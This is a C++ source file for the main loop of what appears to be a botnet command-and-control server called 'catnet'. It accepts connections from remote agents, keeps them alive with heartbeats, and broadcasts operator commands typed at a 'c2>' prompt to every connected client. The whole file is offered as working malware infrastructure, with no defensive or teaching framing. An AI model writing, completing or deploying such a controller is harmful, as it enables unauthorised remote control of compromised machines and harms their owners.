#include <iostream>
#include <vector>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <poll.h>
#include <cstring>
#include <nlohmann/json.hpp>
#include <termcolor/termcolor.hpp>



using json = nlohmann::json;

#include "agentmanager/header/socket.h"
#include "commands/header/commandhandler.h"

int main() {
    if (createsocket() != 0) {
        return 1;
    }

    while (true) {
        int ret = poll(fds.data(), fds.size(), 5000);
        if (ret < 0) break;

        if (ret == 0) { 
            for (size_t i = 2; i < fds.size(); ++i) {
                if (send(fds[i].fd, "keepalive", 9, 0) < 0) {
                    std::cout << "\r[-] Client " << fds[i].fd << " lost (Heartbeat failed).\nc2> " << std::flush;
                    close(fds[i].fd);
                    fds.erase(fds.begin() + i--);
                }
            }
            continue;
        }

        for (size_t i = 0; i < fds.size(); ++i) {
            if (!(fds[i].revents & POLLIN)) continue;


            if (fds[i].fd == sfd) { 
                int cfd = accept(sfd, nullptr, nullptr);
                if (cfd >= 0) {
                    fds.push_back({cfd, POLLIN, 0});
                    std::cout << "\r[+] New client connected! ID (Socket): " << cfd << "\nc2> " << std::flush;
                }
            } 
    
            else if (fds[i].fd == STDIN_FILENO) { 
                std::string cmd;
                std::getline(std::cin, cmd);
                
                if (cmd.empty()) {
                    std::cout << termcolor::red << "catnet $> " << termcolor::reset << std::flush;
                    continue;
                }
                
                
                if (!checkcommand(cmd)) {
                    std::cout << termcolor::red << "catnet $> " << termcolor::reset << std::flush;
                    continue;
                }

                for (size_t j = 2; j < fds.size(); ++j) {
                    send(fds[j].fd, cmd.c_str(), cmd.length(), 0);
                }
                
                std::cout << termcolor::red << "catnet $> " << termcolor::reset << std::flush;
            }

            else { 
                char buf[1024] = {0};
                int bytes = recv(fds[i].fd, buf, 1023, 0);
                
                if (bytes <= 0) {
                    std::cout << "\r[-] Client " << fds[i].fd << " disconnected.\nc2> " << std::flush;
                    close(fds[i].fd);
                    fds.erase(fds.begin() + i--);
                }
            }
        }
    }

    for (const auto& slot : fds) {
        if (slot.fd >= 0) close(slot.fd);
    }
    
    return 0;
}